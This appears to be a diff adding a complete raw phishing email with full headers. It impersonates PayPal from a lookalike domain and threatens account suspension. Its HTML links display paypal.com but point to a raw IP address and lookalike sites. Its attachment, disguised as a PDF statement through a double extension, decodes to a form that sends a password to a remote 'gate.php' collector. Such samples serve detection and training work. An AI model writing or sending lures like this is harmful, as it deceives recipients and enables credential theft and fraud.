@@ -1,0 +1,56 @@
+Return-Path: <bounce-7731@mailer.bulk-sender.ru>
+Received: from mail.corp-example.com (mail.corp-example.com [10.0.0.25])
+	by mx.corp-example.com with ESMTP id 7f3a; Fri, 20 Nov 2026 09:14:05 +0000
+Received: from vps-2231.hostingco.net (vps-2231.hostingco.net [185.193.88.4])
+	by mail.corp-example.com with ESMTP id 1c9d; Fri, 20 Nov 2026 09:14:03 +0000
+Authentication-Results: mx.corp-example.com;
+	spf=fail (sender IP is 185.193.88.4) smtp.mailfrom=bulk-sender.ru;
+	dkim=none (message not signed);
+	dmarc=fail action=none header.from=paypa1-secure.com
+From: "PayPal Security" <service@paypa1-secure.com>
+Reply-To: <support-case-88213@protonmail.com>
+To: <jsmith@corp-example.com>
+Subject: URGENT: Your account will be suspended - action required
+Date: Fri, 20 Nov 2026 09:13:58 +0000
+Message-ID: <a81f7e2c@paypa1-secure.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUNDARY-OUTER"
+
+--BOUNDARY-OUTER
+Content-Type: multipart/alternative; boundary="BOUNDARY-ALT"
+
+--BOUNDARY-ALT
+Content-Type: text/plain; charset="utf-8"
+
+Dear Customer,
+
+We detected unusual activity on your account. Your account will be suspended
+within 24 hours unless you verify your identity immediately.
+
+Verify now: https://www.paypal.com/signin
+Backup link: https://bit.ly/3pPlVrfy
+
+PayPal Security Team
+
+--BOUNDARY-ALT
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<p>Dear Customer,</p>
+<p>We detected <b>unusual activity</b> on your account. Your account will be suspended
+within 24 hours unless you verify your identity immediately.</p>
+<p><a href="http://185.193.88.4/paypal/signin/verify.php?id=88213">https://www.paypal.com/signin</a></p>
+<p>Backup link: <a href="https://bit.ly/3pPlVrfy">click here</a></p>
+<p>Or reset at <a href="https://paypal-account-review.xyz/login">PayPal Account Review</a></p>
+</body></html>
+
+--BOUNDARY-ALT--
+
+--BOUNDARY-OUTER
+Content-Type: text/html; name="PayPal_Statement.pdf.html"
+Content-Disposition: attachment; filename="PayPal_Statement.pdf.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPSJodHRwOi8vMTg1LjE5My44OC40L2dhdGUucGhwIj48aW5wdXQgbmFtZT0icGFzcyI+PC9mb3JtPjwvYm9keT48L2h0bWw+
+
+--BOUNDARY-OUTER--
